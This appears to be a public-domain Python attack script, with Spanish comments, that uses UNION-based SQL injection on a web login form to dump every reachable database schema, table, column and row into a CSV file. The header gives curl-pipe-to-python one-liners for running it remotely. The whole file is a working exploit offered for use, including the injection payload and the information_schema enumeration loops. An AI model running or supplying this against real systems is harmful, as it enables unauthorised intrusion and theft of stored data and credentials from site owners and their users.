#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para Dumpear las bases de datos de un servidor web atacando el formulario de login con la vulnerabilidad union based
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/SQLi/DumpearBasesDeDatos-ConVulnUnionBased.py | python3 - Parámetro1 Parámetro2
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/SQLi/DumpearBasesDeDatos-ConVulnUnionBased.py | nano -
#
# Requisitos: # python3 -m pip install --user x --break-system-packages
#
# ----------

import requests
import argparse
import csv
import re
from urllib.parse import urlparse

parser = argparse.ArgumentParser(description="Dump SQL vía SQLi (UNION SELECT), con campos personalizables y salida CSV.")
parser.add_argument("--url", required=True, help="URL del formulario vulnerable, ej: http://10.10.10.10/login")
parser.add_argument("--max", type=int, default=10, help="Máximo de iteraciones por nivel")
parser.add_argument("--userfield", default="username", help="Nombre del campo de usuario")
parser.add_argument("--passfield", default="password", help="Nombre del campo de contraseña")
args = parser.parse_args()

url = args.url
max_enum = args.max
user_field = args.userfield
pass_field = args.passfield

def extract(query):
  payload = f"' UNION SELECT 1,({query}),3 -- -"
  data = {
    user_field: payload,
    pass_field: "x"
  }
  r = requests.post(url, data=data)
  m = re.search(r"([a-zA-Z0-9_@\-.]+)", r.text)
  return m.group(1) if m else None

# CSV
host = urlparse(url).hostname.replace(".", "_")
csv_file = f"dump_{host}.csv"
csvf = open(csv_file, "w", newline="", encoding="utf-8")
csvw = csv.writer(csvf)
csvw.writerow(["Database", "Table", "Column", "RowIndex", "Value"])

for db_i in range(max_enum):
  db = extract(f"SELECT schema_name FROM information_schema.schemata LIMIT {db_i},1")
  if not db: break
  print(f"\n[DB] {db}")
  for tb_i in range(max_enum):
    table = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {tb_i},1")
    if not table: break
    print(f"  [TABLE] {table}")
    cols = []
    for col_i in range(max_enum):
      col = extract(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT {col_i},1")
      if not col: break
      print(f"    [COL] {col}")
      cols.append(col)
    for row_i in range(max_enum):
      found = False
      for col in cols:
        val = extract(f"SELECT {col} FROM {db}.{table} LIMIT {row_i},1")
        if val:
          print(f"      [row {row_i}] {col}: {val}")
          csvw.writerow([db, table, col, row_i, val])
          found = True
      if not found:
        break

csvf.close()
print(f"\nCSV guardado en {csv_file}")
